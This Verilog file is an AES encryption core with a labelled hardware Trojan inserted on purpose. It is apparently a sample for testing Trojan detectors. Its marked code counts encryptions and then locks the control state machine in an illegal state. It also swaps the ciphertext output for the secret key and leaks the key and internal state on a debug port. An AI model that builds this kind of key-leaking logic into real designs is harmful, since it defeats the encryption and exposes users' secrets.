//======================================================================
//
// aes_core.v
// ----------
// The AES core with Trojan T04 - Debug Port Bypass
//
// Trojan T04_p4_debug_port: FSM illegal state injection
// Detected by: FIC (FSM Integrity Checker) and RED (Rare Event Detector)
//
// Trigger: T2 - Sequential counter (after 1st encryption completes)
// Payload: P4 - FSM illegal state injection
//
//======================================================================

`default_nettype none

module aes_core_tapped(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid,

                // Tapped outputs for monitors
                output wire [1407 : 0] round_keys_flat,
                output wire [3 : 0]   muxed_round_nr,
                output wire [127 : 0] state_before_final,

                // Trojan debug port (P4 - exposes internal state)
                output wire [255 : 0] debug_port
               );



  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;
  localparam CTRL_ILLEGAL = 2'h3;  // Illegal FSM state (Trojan T04)


  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  // TROJAN BEGIN: T04_p4_debug_port
  // Encryption counter for sequential trigger
  reg [7:0]   encrypt_count;
  reg         inject_trojan;      // Flag to inject illegal state next cycle
  reg         trojan_triggered;   // Flag that Trojan has been triggered
  reg         debug_port_en;      // Enable debug port output
  // Internal state snapshot for debug port
  reg [1:0]   saved_ctrl_state;
  reg [3:0]   saved_round_nr;
  reg [127:0] saved_block;
  // TROJAN END: T04_p4_debug_port

  // State before final round (for ORC)
  reg [127 : 0] state_before_final_int;


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr_int;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem_tapped keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr_int),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw),
                     .round_keys_flat(round_keys_flat)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign ready          = ready_reg;

  // TROJAN BEGIN: T04_p4_debug_port
  // Output: key when Trojan triggered, else normal ciphertext
  // AES-128: key is 128 bits (key[127:0])
  assign result = (trojan_triggered || debug_port_en) ? key[127:0] : muxed_new_block;
  // TROJAN END: T04_p4_debug_port

  assign result_valid   = result_valid_reg;
  assign muxed_round_nr = muxed_round_nr_int;
  assign state_before_final = state_before_final_int;

  // TROJAN BEGIN: T04_p4_debug_port
  // Debug port exposes internal state when triggered
  assign debug_port = debug_port_en
                      ? {64'h0,
                         2'b0, saved_ctrl_state,        // FSM state (2 bits)
                         60'h0,
                         4'b0, saved_round_nr,         // Round counter (4 bits)
                         48'h0,
                         16'h0, saved_block[127:112],  // Partial block MSB
                         96'h0,
                         key[127:0]}                   // Key material
                      : 256'h0;
  // TROJAN END: T04_p4_debug_port


  //----------------------------------------------------------------
  // reg_update
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg    <= 1'b0;
          ready_reg           <= 1'b1;
          aes_core_ctrl_reg   <= CTRL_IDLE;
          // TROJAN BEGIN: T04_p4_debug_port
          encrypt_count       <= 8'd0;
          inject_trojan       <= 1'b0;
          trojan_triggered    <= 1'b0;
          debug_port_en       <= 1'b0;
          saved_ctrl_state    <= 2'b0;
          saved_round_nr      <= 4'h0;
          saved_block         <= 128'h0;
          // TROJAN END: T04_p4_debug_port
          state_before_final_int <= 128'b0;
        end
      else
        begin
          // Update result_valid
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          // Update ready
          if (ready_we)
            ready_reg <= ready_new;

          // TROJAN: T04 - Inject illegal FSM state when flag is set
          // This overrides normal FSM update
          if (inject_trojan) begin
            $display("T04_REG: Injecting illegal FSM state (2'b11)");
            aes_core_ctrl_reg <= CTRL_ILLEGAL;
            inject_trojan <= 1'b0;
          end else if (aes_core_ctrl_we) begin
            aes_core_ctrl_reg <= aes_core_ctrl_new;
          end

          // TROJAN: T04 - Count encryptions and set trigger flag
          // Increment counter when entering encryption mode
          if (aes_core_ctrl_reg == CTRL_IDLE && next && encdec) begin
            encrypt_count <= encrypt_count + 8'd1;
            // Trigger on 2nd+ encryption (only once per key load)
            // Check OLD value of counter (before increment): if it was >= 1, trigger
            if (encrypt_count >= 8'd1 && !inject_trojan && !trojan_triggered) begin
              $display("T04_REG: Trojan trigger! encrypt_count=%d, injecting illegal state", encrypt_count + 1);
              inject_trojan <= 1'b1;
              trojan_triggered <= 1'b1;
              // Capture state for debug port
              saved_ctrl_state <= CTRL_ILLEGAL;
              saved_round_nr <= muxed_round_nr_int;
              saved_block <= block;
            end
          end

          // Enable debug port for one cycle
          if (trojan_triggered && !debug_port_en) begin
            debug_port_en <= 1'b1;
          end else begin
            debug_port_en <= 1'b0;
          end

          // Capture state before final round for ORC
          if (enc_next && (enc_round_nr == 4'd10))
            state_before_final_int <= block;
          else if (enc_next && (enc_round_nr < 4'd10))
            state_before_final_int <= enc_new_block;
        end
    end // reg_update


  //----------------------------------------------------------------
  // sbox_mux
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          enc_next        = next;
          muxed_round_nr_int  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          dec_next        = next;
          muxed_round_nr_int  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux


  //----------------------------------------------------------------
  // aes_core_ctrl
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      // TROJAN: T04 - If FSM is already in illegal state, stay there
      // This prevents FSM from recovering to normal state
      if (aes_core_ctrl_reg == CTRL_ILLEGAL) begin
        $display("T04_FSM: FSM in illegal state, staying in 2'b11");
        aes_core_ctrl_new = CTRL_ILLEGAL;
        aes_core_ctrl_we  = 1'b1;
      end
      else case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin
            // TROJAN: T04 - Stay in illegal state if we ever get here
            aes_core_ctrl_new = CTRL_ILLEGAL;
            aes_core_ctrl_we  = 1'b1;
          end
      endcase // case (aes_core_ctrl_reg)

    end // aes_core_ctrl
endmodule // aes_core_tapped

//======================================================================
// EOF aes_core.v
//======================================================================
